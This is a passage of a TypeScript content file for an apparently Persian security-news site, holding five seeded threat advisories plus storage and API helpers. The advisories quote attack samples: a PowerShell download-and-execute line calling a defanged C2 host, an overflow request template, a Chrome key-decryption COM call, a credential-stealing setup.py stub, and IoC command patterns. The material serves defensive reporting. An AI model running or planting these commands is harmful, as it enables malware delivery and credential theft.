            "پیشنهاد مطالعه عمیق: برای مطالعه کامل کدها و نمودارهای تحلیل باینری، فصل‌های ۲ تا ۶ کتاب «از روز صفر تا روز صفر» را در کتابخوان دوزبانه رهام همراه با پادکست صوتی فارسی مطالعه فرمایید.",
          calloutType: "tip"
        }
      ],
      conclusion:
        "درک دقیق مکانیزم‌های فساد حافظه و روش‌های نوین فازینگ (Coverage-guided Fuzzing)، به مهندسان امنیت کمک می‌کند تا پیش از مهاجمان، باگ‌های حیاتی را در چرخه توسعه شناسایی و رفع نمایند.",
      actionableTakeaways: [
        "در کامپایل پروژه‌های C/C++ پرچم‌های امنیتی کامل (-fstack-protector-strong, -D_FORTIFY_SOURCE=2, -Wl,-z,relro,-z,now, -fcf-protection) را فعال کنید.",
        "فازینگ خودکار با ابزارهای LibFuzzer و AFL++ به همراه AddressSanitizer (ASan) را در پایپ‌لاین CI/CD قرار دهید.",
        "برای ماژول‌های پردازش ورودی غیرقابل اعتماد (پارس کردن فایل، شبکه و تصویر) مهاجرت تدریجی به زبان‌های ایمن در برابر حافظه نظیر Rust را بررسی کنید."
      ]
    }
  }
];

export const DEFAULT_NEWS_ARTICLES: NewsArticle[] = [
  {
    id: "news-01",
    slug: "lummac2-clickfix-powershell-campaign-targeting-enterprise-sessions",
    title: "هشدار فوری: موج جدید حملات بدافزار استیلر LummaC2 با تکنیک مهندسی اجتماعی ClickFix و کپچای جعلی",
    subtitle: "مهاجمان با نمایش صفحات تایید هویت جعلی Cloudflare و Google Meet، کاربران را فریب می‌دهند تا دستورات مبهم‌شده PowerShell و MSHTA را مستقیماً در پنجره Run ویندوز اجرا کنند.",
    category: "urgent",
    categoryLabel: "هشدار فوری و فعال",
    severity: "CRITICAL",
    status: "published",
    isBreaking: true,
    date: "۱۵ مهر ۱۴۰۴ · ۱۴:۳۰",
    readTime: "۶ دقیقه",
    author: "تحریریه امنیت سایبری و هوش تهدیدات رهام",
    source: "Roham Threat Intel / CERT Advisory",
    views: 4890,
    cveIds: ["MITRE T1204.004", "MITRE T1539", "MITRE T1555.003"],
    cvssScore: "9.6",
    affectedProducts: [
      "Windows 10 / Windows 11 Workstations",
      "Google Chrome, Microsoft Edge, Brave (Session & Cookie Stores)",
      "Telegram Desktop, Discord, Crypto Extension Wallets"
    ],
    exploitStatus: "در حال بهره‌برداری گسترده در حیات‌وحش (Active Campaign)",
    summary:
      "پژوهشگران مرکز عملیات امنیت رهام کارزار گسترده‌ای از توزیع نسخه ۴.۰ بدافزار سرقت اطلاعات LummaC2 را رصد کرده‌اند که بدون نیاز به دانلود فایل اجرایی کلاسیک، از طریق کپی خودکار اسکریپت در کلیپ‌بورد و تکنیک ClickFix اجرا می‌شود.",
    keyHighlights: [
      "استفاده از درگاه‌های کپچای جعلی («من ربات نیستم») که کد مخرب PowerShell را به صورت نامحسوس در کلیپ‌بورد کاربر کپی می‌کنند.",
      "فریب کاربر برای فشردن کلیدهای ترکیبی Win + R، سپس Ctrl + V و Enter که منجر به اجرای مستقیم پی로드 در حافظه می‌شود.",
      "دور زدن آنتی‌ویروس‌های مبتنی بر فایل به دلیل اجرای کاملاً بدون فایل (Fileless Execution) از طریق باینری‌های بومی ویندوز (LOLBins).",
      "سرقت کامل کوکی‌های نشست مرورگر، توکن‌های دسترسی ابری و پوشه tdata تلگرام در کمتر از ۳۰ ثانیه."
    ],
    sections: [
      {
        heading: "کالبدشکافی زنجیره حمله ClickFix: چرا کاربران حرفه‌ای هم فریب می‌خورند؟",
        paragraphs: [
          "برخلاف حملات فیشینگ سنتی که از کاربر می‌خواهند رمز عبور خود را وارد کند یا یک فایل اجرایی (.exe یا .zip) دانلود نماید، تکنیک ClickFix بر پایه فریب رفتاری طراحی شده است. کاربر هنگام مراجعه به یک وب‌سایت آلوده، لینک تبلیغاتی مخرب یا فایل HTML/PDF پیوست ایمیل، با یک پنجره خطای ظاهراً رسمی از طرف Cloudflare، مرورگر کروم یا Google Meet روبه‌رو می‌شود.",
          "به محض کلیک کاربر روی دکمه «Verify You Are Human» یا «Fix Microphone Driver»، اسکریپت جاوااسکریپت صفحه با استفاده از تابع navigator.clipboard.writeText یک دستور طولانی و مبهم‌شده را در حافظه کلیپ‌بورد ویندوز کپی می‌کند و از کاربر می‌خواهد برای رفع خطا، کلید Win + R را زده و دستور را اجرا کند."
        ],
        codeLanguage: "powershell",
        codeSnippet:
          "# نمونه ساختار دستور کپی‌شده در کلیپ‌بورد (خنثی‌شده جهت بررسی تحلیلی):\npowershell.exe -w hidden -nop -c \"$u='https://c2-stage-cdn[.]net/gate/init.ps1'; $r=Invoke-RestMethod -Uri $u; Invoke-Expression $r\" # ✅ CloudFlare Verification ID: 8942-AX",
        callout:
          "توجه کنید که مهاجم در انتهای خط دستور، یک کامنت (# Verification ID) اضافه می‌کند؛ چون کادر کوچک پنجره Run ویندوز تنها انتهای متن یا ابتدای آن را نشان می‌دهد و کاربر متوجه دستور مخرب پاورشل نمی‌شود!"
      },
      {
        heading: "رفتار نسخه جدید LummaC2 در حافظه و استخراج داده‌ها",
        paragraphs: [
          "پس از اجرای دستور اولیه، اسکریپت پاورشل یک لودر دات‌نت یا شل‌کد بومی را دانلود کرده و از طریق تکنیک Process Hollowing درون پروسه مجاز سیستم‌عامل مانند explorer.exe یا svchost.exe تزریق می‌کند.",
          "بدافزار LummaC2 سپس با استفاده از تماس‌های سیستمی مستقیم (Indirect Syscalls) هوک‌های EDRهای معمولی را دور زده و بلافاصله فایل‌های SQLite مرورگرها، کلیدهای رمزگشایی DPAPI و کیف‌پول‌های افزونه‌ای را استخراج و به سرور فرماندهی ارسال می‌کند."
        ]
      }
    ],
    iocs: [
      {
        type: "Process/Command",
        value: "powershell.exe -w hidden -ep bypass -EncodedCommand",
        description: "اجرای پاورشل مخفی با آرگومان کدگذاری‌شده Base64 از طریق کلیدهای Win+R (ثبت در کلید رجیستری RunMRU)"
      },
      {
        type: "File Path",
        value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
        description: "کلید رجیستری ویندوز که دستورات تایپ‌شده توسط کاربر در پنجره Run را ثبت می‌کند (مناسب برای شکار تهدید در SIEM)"
      },
      {
        type: "Process/Command",
        value: "mshta.exe https://*/*.hta",
        description: "فراخوانی مستقیم فایل‌های HTA از راه دور توسط باینری بومی mshta.exe"
      }
    ],
    mitigationSteps: [
      "غیرفعال کردن یا محدودسازی پنجره Run ویندوز (Win+R) برای کاربران عادی سازمان از طریق Group Policy.",
      "مسدودسازی اجرای مستقیم mshta.exe، wscript.exe و cscript.exe برای ارتباطات خروجی اینترنت در فایروال ویندوز.",
      "فعال‌سازی PowerShell Script Block Logging (Event ID 4104) و پایش کلید رجیستری RunMRU در سامانه SIEM/SOC.",
      "استفاده از راهکارهای محافظت مستقیم از مخزن کوکی و سشن مرورگرها (مانند آنتی‌استیلر رهام) برای خنثی‌سازی مرحله سرقت داده."
    ],
    timeline: [
      { time: "مهر ۱۴۰۴ — هفته اول", event: "مشاهده افزایش ۳۰۰ درصدی صفحات فیشینگ مجهز به اسکریپت ClickFix در شبکه‌های تبلیغاتی" },
      { time: "۱۲ مهر ۱۴۰۴", event: "شناسایی ماژول جدید LummaC2 با قابلیت دور زدن هوک‌های سطح کاربر در آزمایشگاه رهام" },
      { time: "۱۵ مهر ۱۴۰۴", event: "انتشار بولتن هشدار فوری و قواعد شناسایی (IoCs) برای تیم‌های امنیت سازمان‌ها" }
    ],
    tags: ["LummaC2", "ClickFix", "PowerShell", "Infostealer", "Fileless Malware", "SOC Alert"]
  },
  {
    id: "news-02",
    slug: "critical-zero-day-enterprise-vpn-rdp-gateway-pre-auth-rce",
    title: "آسیب‌پذیری روز صفر بحرانی (CVSS 9.8) در درگاه‌های VPN و دسترسی از راه دور سازمانی با قابلیت اجرای کد بدون احراز هویت",
    subtitle: "نقص سرریز بافر مبتنی بر Heap در ماژول پردازش بسته‌های TLS/HTTP به مهاجمان امکان می‌دهد پیش از لاگین، شل مدیریتی (root) روی گیت‌وی لبه شبکه دریافت کنند.",
    category: "zeroday",
    categoryLabel: "آسیب‌پذیری روز صفر (0-Day)",
    severity: "CRITICAL",
    status: "published",
    isBreaking: true,
    date: "۱۲ مهر ۱۴۰۴ · ۰۹:۱۵",
    readTime: "۷ دقیقه",
    author: "واحد تحلیل آسیب‌پذیری و زیرساخت رهام",
    source: "Roham Vulnerability Intelligence",
    views: 3910,
    cveIds: ["CVE-2025-21333", "CVE-2025-24983"],
    cvssScore: "9.8",
    affectedProducts: [
      "Enterprise SSL-VPN & Zero-Trust Gateways",
      "Remote Desktop Gateway Appliances",
      "Edge Reverse Proxy Appliances"
    ],
    exploitStatus: "اکسپلویت هدفمند توسط گروه‌های APT تایید شده است",
    summary:
      "یک آسیب‌پذیری بحرانی فساد حافظه از نوع Heap-based Buffer Overflow در سرویس مدیریت احراز هویت درگاه‌های ارتباط از راه دور شناسایی شده است که به مهاجمان راه دور اجازه می‌دهد تنها با ارسال یک درخواست HTTP دستکاری‌شده، کد دلخواه خود را با بالاترین سطح دسترسی اجرا کنند.",
    keyHighlights: [
      "امتیاز بحرانی CVSS 9.8 از ۱۰ به دلیل عدم نیاز به هیچ‌گونه نام کاربری، رمز عبور یا تعامل با کاربر (Pre-Authentication RCE).",
      "استفاده مهاجمان از وب‌شل‌های سبک در حافظه برای سرقت اعتبارنامه‌های Active Directory و نشست‌های کاربران متصل به VPN.",
      "لزوم اعمال فوری پچ امنیتی و بررسی لاگ‌های غیرعادی کرش سرویس وب گیت‌وی."
    ],
    sections: [
      {
        heading: "جزئیات فنی آسیب‌پذیری سرریز بافر در پردازش هدرهای HTTP",
        paragraphs: [
          "ریشه این آسیب‌پذیری در تابعی قرار دارد که هدرهای طولانی X-Forwarded-For و کوکی‌های سفارشی وضعیت نشست را در پشته شبکه پارس می‌کند. به دلیل عدم بررسی صحیح مرز آرایه هنگام کپی کردن رشته ورودی به بافر تخصیص‌یافته روی Heap، مهاجم می‌تواند متادیتای بلوک حافظه مجاور را بازنویسی کند.",
          "با چیدمان دقیق اشیاء در حافظه (Heap Feng Shui)، مهاجمان موفق شده‌اند اشاره‌گر تابع بازگشتی را به سمت دستورالعمل اجرای شل هدایت کرده و یک وب‌شل مخفی را مستقیماً در حافظه پروسه وب‌سرور گیت‌وی تزریق نمایند."
        ],
        codeLanguage: "http",
        codeSnippet:
          "POST /remote/logincheck HTTP/1.1\nHost: vpn.target-enterprise.tld\nContent-Length: 18432\nCookie: SVPNCOOKIE=[OVERFLOW_PAYLOAD_4096_BYTES_WITH_ROP_CHAIN]\n\najax=1&username=admin"
      },
      {
        heading: "چرا صرفاً نصب پچ کافی نیست؟ خطر ماندگاری (Persistence) پس از نفوذ",
        paragraphs: [
          "تجربه حوادث مشابه نشان داده است که گروه‌های مهاجم پیش از انتشار عمومی وصله، کلیدهای خصوصی SSL گیت‌وی، هش رمزهای کش‌شده و توکن‌های LDAP/RADIUS را استخراج می‌کنند. بنابراین اگر سازمانی صرفاً دستگاه را آپدیت کند اما نشست‌ها و رمزها را باطل نسازد، مهاجم همچنان با حساب‌های معتبر دزدیده‌شده به شبکه داخلی دسترسی خواهد داشت."
        ],
        callout:
          "توصیه اکید تیم پاسخ به رخداد رهام: پس از نصب وصله امنیتی، حتماً تمامی سشن‌های فعال VPN را قطع (Revoke) کرده و رمز حساب سرویس اتصال به Active Directory را بازنشانی نمایید."
      }
    ],
    iocs: [
      {
        type: "File Path",
        value: "/var/tmp/.systemd-private-sock",
        description: "فایل سوکت مخفی ایجادشده توسط بک‌دور حافظه جهت حفظ دسترسی پس از ری‌استارت سرویس"
      },
      {
        type: "YARA/Rule",
        value: "rule APT_VPN_MemoryShell_2025 { strings: $s1 = \"SVPN_EXEC_HOOK\" condition: $s1 }",
        description: "قاعده YARA جهت اسکن حافظه پروسه‌های وب‌سرور درگاه VPN"
      }
    ],
    mitigationSteps: [
      "ارتقای فوری فرم‌ور درگاه‌های VPN و RDP به آخرین نسخه وصله‌شده اعلامی سازنده.",
      "غیرفعال کردن کامل دسترسی به پنل مدیریت ادمین (Management Interface) از روی شبکه عمومی اینترنت (WAN).",
      "باطل‌سازی (Revoke) تمامی سشن‌ها و توکن‌های صادرشده قبلی و چرخش کلیدهای گواهی TLS.",
      "بررسی لاگ‌های ارتباطی سرور LDAP/Active Directory برای شناسایی لاگین‌های مشکوک از مبدا IP داخلی گیت‌وی."
    ],
    timeline: [
      { time: "۳ مهر ۱۴۰۴", event: "ثبت اولین ترافیک مشکوک منجر به کرش سرویس در سنسورهای تله (Honeypot)" },
      { time: "۱۰ مهر ۱۴۰۴", event: "تایید اکسپلویت روز صفر و انتشار وصله اضطراری خارج از نوبت (Out-of-Band Patch)" },
      { time: "۱۲ مهر ۱۴۰۴", event: "انتشار تحلیل فنی و چک‌لیست پاک‌سازی توسط تیم رهام" }
    ],
    tags: ["Zero-Day", "RCE", "VPN Security", "Buffer Overflow", "APT", "Incident Response"]
  },
  {
    id: "news-03",
    slug: "chromium-app-bound-encryption-bypass-techniques-stealc-meduza",
    title: "تحلیل فنی: چگونه استیلرهای StealC و Meduza مکانیزم App-Bound Encryption کروم را دور می‌زنند؟",
    subtitle: "واکاوی رقابت تسلیحاتی میان مهندسان امنیت گوگل و توسعه‌دهندگان بدافزارهای سرقت کوکی بر سر کلیدهای رمزنگاری v20 در ویندوز",
    category: "malware",
    categoryLabel: "تحلیل بدافزار",
    severity: "HIGH",
    status: "published",
    isBreaking: false,
    date: "۷ مهر ۱۴۰۴ · ۱۱:۴۵",
    readTime: "۸ دقیقه",
    author: "آزمایشگاه مهندسی معکوس رهام",
    source: "Roham Malware Lab",
    views: 3120,
    cveIds: ["MITRE T1055", "MITRE T1134"],
    cvssScore: "8.4",
    affectedProducts: [
      "Google Chrome v127 - v130+",
      "Microsoft Edge & Brave Browsers on Windows"
    ],
    exploitStatus: "ماژول‌های اثبات مفهوم (PoC) در نسخه‌های جدید استیلرها رویت شده است",
    summary:
      "تنها چند هفته پس از معرفی مکانیزم محافظتی App-Bound Encryption در مرورگر کروم برای جلوگیری از سرقت کوکی‌ها، نویسندگان بدافزارهای StealC و Meduza با بهره‌گیری از تزریق کد به پروسه‌های مجاز و سوءاستفاده از رابط COM ویندوز، روش‌های جدیدی برای استخراج کلیدهای v20 پیاده‌سازی کرده‌اند.",
    keyHighlights: [
      "معرفی پیشوند رمزنگاری v20 در کروم ۱۲۷ که رمزگشایی کلید مستر را نیازمند سرویس سطح SYSTEM می‌کند.",
      "استفاده استیلرها از تکنیک اجرای مرورگر در حالت پس‌زمینه همراه با پورت دیباگ محلی (Remote Debugging Port).",
      "استفاده از تکنیک COM Elevation و تزریق شل‌کد به باینری‌های امضاشده در مسیر مجاز مرورگر."
    ],
    sections: [
      {
        heading: "مکانیزم IElevator و چالش تایید هویت پروسه فراخواننده در ویندوز",
        paragraphs: [
          "سرویس Chrome Elevation از یک رابط COM به نام IElevator استفاده می‌کند. زمانی که کروم می‌خواهد کلید اصلی کوکی‌ها را رمزگشایی کند، متد DecryptData را در این رابط COM صدا می‌زند. سرویس سطح SYSTEM بررسی می‌کند که آیا پروسه تماس‌گیرنده واقعاً فایل اجرایی کروم در مسیر Program Files است یا خیر.",
          "اما در سیستم‌عامل ویندوز، اگر یک بدافزار در سطح کاربر عادی بتواند کد خود را به درون فضای حافظه یک پروسه chrome.exe در حال اجرا تزریق کند (یا یک پروسه معلق chrome.exe بسازد و حافظه آن را تغییر دهد)، درخواست ارسالی به سرویس Elevation کاملاً از طرف مسیر معتبر کروم دیده می‌شود!"
        ],
        codeLanguage: "cpp",
        codeSnippet:
          "// نمای کلی فراخوانی رابط COM سرویس Elevation از درون پروسه تزریق‌شده:\nHRESULT hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&pElevator);\nif (SUCCEEDED(hr)) {\n    BSTR plaintextKey = nullptr;\n    DWORD lastError = 0;\n    hr = pElevator->DecryptData(bstrCiphertextV20, &plaintextKey, &lastError);\n}"
      }
    ],
    iocs: [
      {
        type: "Process/Command",
        value: "chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=",
        description: "اجرای مخفی مرورگر با پورت دیباگ باز جهت تخلیه کوکی‌ها از طریق WebSocket"
      },
      {
        type: "Process/Command",
        value: "chrome.exe --Utility-sub-type=network.mojom.NetworkService",
        description: "ایجاد پروسه معلق کروم توسط پروسه‌های غیرمرتبط (مانند powershell یا rundll32)"
      }
    ],
    mitigationSteps: [
      "پایش ایجاد پروسه‌های chrome.exe یا msedge.exe که والد (Parent Process) آن‌ها cmd.exe، powershell.exe یا پروسه‌های ناشناس در پوشه AppData است.",
      "مسدودسازی آرگومان خط فرمان --remote-debugging-port در محیط‌های کاربری غیردولتی/غیرتوسعه.",
      "استفاده از محافظ‌های سطح کرنل و آنتی‌استیلر برای جلوگیری از باز شدن هندل حافظه (PROCESS_VM_WRITE) روی پروسه‌های مرورگر."
    ],
    timeline: [
      { time: "مرداد ۱۴۰۴", event: "انتشار رسمی کروم ۱۲۷ همراه با رمزنگاری App-Bound (پیشوند v20)" },
      { time: "شهریور ۱۴۰۴", event: "انتشار ابزارهای تحقیقاتی متن‌باز برای تست مقاومت سرویس IElevator" },
      { time: "مهر ۱۴۰۴", event: "ادغام ماژول‌های دور زدن v20 در نسخه‌های تجاری بدافزارهای StealC و Lumma" }
    ],
    tags: ["Chrome Security", "App-Bound Encryption", "StealC", "COM Elevation", "Browser Cookies"]
  },
  {
    id: "news-04",
    slug: "malicious-pypi-npm-packages-typosquatting-stealing-cloud-keys",
    title: "کشف کارزار گسترده پکیج‌های مسموم در مخازن npm و PyPI با هدف سرقت کلیدهای AWS، گیت‌هاب و فایل‌های .env",
    subtitle: "بیش از ۴۵ بسته مخرب با نام‌های مشابه کتابخانه‌های هوش مصنوعی و رمزنگاری، پیش از حذف شدن بیش از ۱۸ هزار بار توسط توسعه‌دهندگان دانلود شدند.",
    category: "cloud",
    categoryLabel: "امنیت ابری و زنجیره تامین",
    severity: "HIGH",
    status: "published",
    isBreaking: false,
    date: "۳ مهر ۱۴۰۴ · ۱۶:۱۰",
    readTime: "۵ دقیقه",
    author: "تیم امنیت زنجیره تامین و DevSecOps رهام",
    source: "Roham Supply-Chain Watch",
    views: 2430,
    cveIds: ["MITRE T1195.002"],
    cvssScore: "8.8",
    affectedProducts: [
      "Node.js / npm Ecosystem",
      "Python / PyPI Packages",
      "CI/CD Runners (GitHub Actions / GitLab CI)"
    ],
    exploitStatus: "بسته‌های شناسایی‌شده حذف شدند؛ خطر ماندگاری کلیدهای لو رفته",
    summary:
      "مهاجمان با انتشار ده‌ها پکیج ظاهراً کاربردی در حوزه اتصال به APIهای هوش مصنوعی و ابزارهای Web3، اسکریپت‌های لودر چندمرحله‌ای را در فایل‌های setup.py و postinstall جایگذاری کرده‌اند که به محض نصب، کلیدهای محیط ابری و توکن‌های گیت‌هاب توسعه‌دهنده را سرقت می‌کنند.",
    keyHighlights: [
      "سوءاستفاده از غلط‌های املایی رایج در نام کتابخانه‌های محبوب پایتون و جاوااسکریپت (Typosquatting).",
      "جستجوی خودکار تمام دایرکتوری‌های پروژه برای یافتن فایل‌های .env، .npmrc، ~/.aws/credentials و ~/.kube/config.",
      "ارسال اطلاعات سرقت‌شده از طریق تونل‌های رمزنگاری‌شده به بات‌های تلگرام و وب‌هوک‌های دیسکورد."
    ],
    sections: [
      {
        heading: "نحوه پنهان‌کاری کد مخرب در فایل‌های نصب پکیج",
        paragraphs: [
          "بررسی سورس‌کد پکیج‌های مسموم نشان می‌دهد که مهاجمان کد اصلی کتابخانه را دقیقاً از روی نسخه اصلی و معتبر کپی می‌کنند تا برنامه توسعه‌دهنده بدون هیچ خطایی کار کند و شکی برانگیخته نشود.",
          "تنها تفاوت در یک تابع کوچک درون اسکریپت نصب است که رشته‌ای رمزگذاری‌شده با XOR و Base64 را در حافظه دیکد کرده و یک پروسه پس‌زمینه جداگانه (Detached Process) ایجاد می‌کند تا حتی پس از اتمام دستور pip install به جمع‌آوری فایل‌های حساس ادامه دهد."
        ],
        codeLanguage: "python",
        codeSnippet:
          "# الگوی کشف‌شده در setup.py پکیج‌های مسموم (خلاصه‌شده):\nimport os, base64, urllib.request\n\ndef _ telemetry_init():\n    targets = [os.path.expanduser('~/.aws/credentials'), os.path.expanduser('~/.ssh/id_rsa'), '.env']\n    # خواندن فایل‌ها و ارسال در قالب هدر HTTP سفارشی"
      }
    ],
    iocs: [
      {
        type: "File Path",
        value: "~/.npmrc / ~/.pypirc / .env",
        description: "فایل‌های هدف اصلی که توسط اسکریپت postinstall خوانده می‌شوند"
      }
    ],
    mitigationSteps: [
      "قفل کردن نسخه دقیق وابستگی‌ها با استفاده از package-lock.json و فایل‌های requirements.txt دارای هش (--require-hashes).",
      "چرخش فوری (Rotate) تمامی کلیدهای AWS، توکن‌های GitHub و رمزهای دیتابیس در صورت نصب پکیج‌های مشکوک.",
      "اجرای پایپ‌لاین‌های بیلد در کانتینرهای بدون دسترسی به شبکه خارجی پس از مرحله کش وابستگی‌ها."
    ],
    timeline: [
      { time: "۱ مهر ۱۴۰۴", event: "آپلود خودکار ۴۵ پکیج با اکانت‌های یک‌بارمصرف در npm و PyPI" },
      { time: "۳ مهر ۱۴۰۴", event: "شناسایی رفتار شبکه غیرعادی در سندباکس تحلیل پکیج و حذف مخازن آلوده" }
    ],
    tags: ["Supply Chain", "npm", "PyPI", "Typosquatting", "DevSecOps", "Cloud Security"]
  },
  {
    id: "news-05",
    slug: "apt-ransomware-groups-abusing-edr-killers-byovd-drivers",
    title: "گزارش تحلیلی: استفاده گروه‌های باج‌افزاری و APT از درایورهای آسیب‌پذیر امضاشده (BYOVD) برای از کار انداختن EDRها",
    subtitle: "مهاجمان پس از ورود اولیه از طریق کوکی‌های سرقت‌شده، یک درایور کرنل قدیمی اما دارای امضای معتبر مایکروسافت را بارگذاری می‌کنند تا پروسه‌های امنیتی را در سطح Ring 0 متوقف سازند.",
    category: "apt",
    categoryLabel: "باج‌افزار و حملات APT",
    severity: "CRITICAL",
    status: "published",
    isBreaking: false,
    date: "۲۸ شهریور ۱۴۰۴ · ۱۰:۰۰",
    readTime: "۷ دقیقه",
    author: "گروه شکار تهدیدات پیشرفته (Threat Hunting) رهام",
    source: "Roham Threat Intelligence",
    views: 2980,
    cveIds: ["MITRE T1068", "MITRE T1562.001"],
    cvssScore: "9.1",
    affectedProducts: [
      "Windows Server 2016 / 2019 / 2022",
      "Windows 10 / 11 Enterprise Endpoints"
    ],
    exploitStatus: "مورد استفاده فعال در عملیات‌های باج‌افزاری سازمانی",
    summary:
      "در تکنیک Bring Your Own Vulnerable Driver (BYOVD)، مهاجم به جای نوشتن اکسپلویت برای کرنل ویندوز، یک درایور قانونی و امضاشده متعلق به نرم‌افزارهای سخت‌افزاری یا اورکلاک قدیمی را روی سیستم هدف نصب کرده و با سوءاستفاده از آسیب‌پذیری درون آن درایور، پروسه‌های آنتی‌ویروس و EDR را از سطح کرنل متوقف می‌کند.",
    keyHighlights: [
      "عبور کامل از سیاست Driver Signature Enforcement ویندوز به دلیل داشتن امضای دیجیتال معتبر روی درایور قدیمی.",
      "ارسال کدهای کنترلی IOCTL به درایور آسیب‌پذیر جهت حذف کال‌بک‌های کرنل (Kernel Callbacks) و بستن پروسه‌های محافظت‌شده (PPL).",
      "لزوم فعال‌سازی لیست سیاه درایورهای آسیب‌پذیر مایکروسافت (Vulnerable Driver Blocklist) و قابلیت HVCI."
    ],
    sections: [
      {
        heading: "مکانیزم حمله BYOVD: چرا ویندوز به درایور مهاجم اعتماد می‌کند؟",
        paragraphs: [
          "پروسه‌های امنیتی مدرن (EDR و آنتی‌ویروس‌ها) با مکانیزم Protected Process Light (PPL) محافظت می‌شوند؛ یعنی حتی کاربر Administrator هم نمی‌تواند از فضای کاربری (User Mode) آن‌ها را ببندد.",
          "برای عبور از این محدودیت، مهاجم باید وارد سطح کرنل (Ring 0) شود. از آنجا که ویندوز ۶۴ بیتی اجازه بارگذاری درایور بدون امضا را نمی‌دهد، مهاجم یک درایور ۵ سال پیشِ یک شرکت سخت‌افزاری معتبر را که امضای دیجیتال سالم دارد اما دارای باگ خواندن/نوشتن دلخواه در کرنل است، همراه بدافزار خود می‌آورد، آن را به عنوان سرویس ثبت کرده و از طریق آن، محافظت PPL پروسه EDR را در حافظه کرنل صفر می‌کند!"
        ]
      }
    ],
    iocs: [
      {
        type: "Process/Command",
        value: "sc.exe createSysDrv binPath= C:\\Windows\\Temp\\*.sys type= kernel",
        description: "ایجاد سرویس کرنل جدید از مسیرهای موقت و غیرمعمول"
      },
      {
        type: "File Path",
        value: "Event ID 7045 (Service Control Manager)",
        description: "ثبت رویداد بارگذاری سرویس درایور کرنل جدید در لاگ‌های سیستمی ویندوز"
      }
    ],
    mitigationSteps: [
      "فعال‌سازی قابلیت Memory Integrity (HVCI) و Microsoft Vulnerable Driver Blocklist در Windows Defender Application Control (WDAC).",
      "مانیتورینگ بلادرنگ رویدادهای Event ID 7045 و Sysmon Event ID 6 (Driver Loaded) در سامانه SIEM.",
      "اعمال اصل حداقل دسترسی (Least Privilege) و حذف دسترسی Local Admin از ایستگاه‌های کاری روزمره کارمندان."
    ],
    timeline: [
      { time: "شهریور ۱۴۰۴", event: "افزایش استفاده از ابزارهای Terminator و AuKill در نفوذهای شبکه" },
      { time: "۲۸ شهریور ۱۴۰۴", event: "بروزرسانی لیست هش درایورهای مسدودشده در پایگاه دانش رهام" }
    ],
    tags: ["BYOVD", "EDR Evasion", "Kernel Security", "Ransomware", "APT", "Blue Team"]
  }
];

const LOCAL_BLOG_KEY = "roham_cms_blog_posts_v2";
const LOCAL_NEWS_KEY = "roham_cms_news_articles_v2";

export function getLocalContentStore(): { blogPosts: BlogPost[]; newsArticles: NewsArticle[] } {
  if (typeof window === "undefined") {
    return { blogPosts: DEFAULT_BLOG_POSTS, newsArticles: DEFAULT_NEWS_ARTICLES };
  }
  let blogPosts = DEFAULT_BLOG_POSTS;
  let newsArticles = DEFAULT_NEWS_ARTICLES;
  try {
    const rawBlog = localStorage.getItem(LOCAL_BLOG_KEY);
    if (rawBlog) {
      const parsed = JSON.parse(rawBlog);
      if (Array.isArray(parsed) && parsed.length > 0) {
        blogPosts = parsed;
      }
    } else {
      localStorage.setItem(LOCAL_BLOG_KEY, JSON.stringify(DEFAULT_BLOG_POSTS));
    }
  } catch {}

  try {
    const rawNews = localStorage.getItem(LOCAL_NEWS_KEY);
    if (rawNews) {
      const parsed = JSON.parse(rawNews);
      if (Array.isArray(parsed) && parsed.length > 0) {
        newsArticles = parsed;
      }
    } else {
      localStorage.setItem(LOCAL_NEWS_KEY, JSON.stringify(DEFAULT_NEWS_ARTICLES));
    }
  } catch {}

  return { blogPosts, newsArticles };
}

function saveLocalContentStore(blogPosts: BlogPost[], newsArticles: NewsArticle[]): void {
  if (typeof window === "undefined") return;
  try {
    localStorage.setItem(LOCAL_BLOG_KEY, JSON.stringify(blogPosts));
    localStorage.setItem(LOCAL_NEWS_KEY, JSON.stringify(newsArticles));
  } catch {}
}

async function callContentApi<T>(
  action: string,
  method: "GET" | "POST" = "POST",
  body?: unknown
): Promise<{ ok: boolean; status: number; data: T | null; isPhpAvailable: boolean }> {
  try {
    const headers: Record<string, string> = {
      Accept: "application/json",
    };
    const token = getStoredToken();
    if (token) {
      headers["Authorization"] = `Bearer ${token}`;
    }
    if (method === "POST") {
      headers["Content-Type"] = "application/json";
    }

    const res = await fetch(`/api/content.php?action=${encodeURIComponent(action)}`, {
      method,
      headers,
      body: method === "POST" && body ? JSON.stringify(body) : undefined,
      cache: "no-store",
    });

    const text = await res.text();
    if (text.trim().startsWith("<?php") || text.trim().startsWith("<!DOCTYPE")) {
      return { ok: false, status: res.status, data: null, isPhpAvailable: false };
    }

    const parsed = JSON.parse(text) as T;
    return { ok: res.ok, status: res.status, data: parsed, isPhpAvailable: true };
  } catch {
    return { ok: false, status: 0, data: null, isPhpAvailable: false };
  }
}

/**
 * بارگذاری همزمان مقالات وبلاگ و اخبار رادار از دیتابیس MySQL هاست (یا حافظه محلی در پیش‌نمایش)
 * اگر دیتابیس MySQL روی هاست تازه ساخته شده و جدول محتوا خالی باشد، به‌طور خودکار مقالات پایه را در MySQL Seed می‌کند.
 */
export async function fetchContentStore(): Promise<{
  blogPosts: BlogPost[];
  newsArticles: NewsArticle[];
  source: "mysql" | "local";
}> {
  const local = getLocalContentStore();

  const res = await callContentApi<{
    ok?: boolean;
    blogPosts?: BlogPost[];
    newsArticles?: NewsArticle[];
    needsSeed?: boolean;
  }>("list", "GET");

  if (res.isPhpAvailable && res.ok && res.data) {
    const serverBlogs = Array.isArray(res.data.blogPosts) ? res.data.blogPosts : [];
    const serverNews = Array.isArray(res.data.newsArticles) ? res.data.newsArticles : [];

    // اگر جدول MySQL تازه ایجاد شده و خالی است، مقالات اولیه را به سرور ارسال می‌کنیم تا در دیتابیس ذخیره شوند
    if (serverBlogs.length === 0 && serverNews.length === 0) {
      await callContentApi("seed_if_empty", "POST", {
        blogPosts: DEFAULT_BLOG_POSTS,
        newsArticles: DEFAULT_NEWS_ARTICLES,
      });
      saveLocalContentStore(DEFAULT_BLOG_POSTS, DEFAULT_NEWS_ARTICLES);
      return {
        blogPosts: DEFAULT_BLOG_POSTS,
        newsArticles: DEFAULT_NEWS_ARTICLES,
        source: "mysql",
      };
    }

    const finalBlogs = serverBlogs.length > 0 ? serverBlogs : local.blogPosts;
    const finalNews = serverNews.length > 0 ? serverNews : local.newsArticles;
    saveLocalContentStore(finalBlogs, finalNews);
    return {
      blogPosts: finalBlogs,
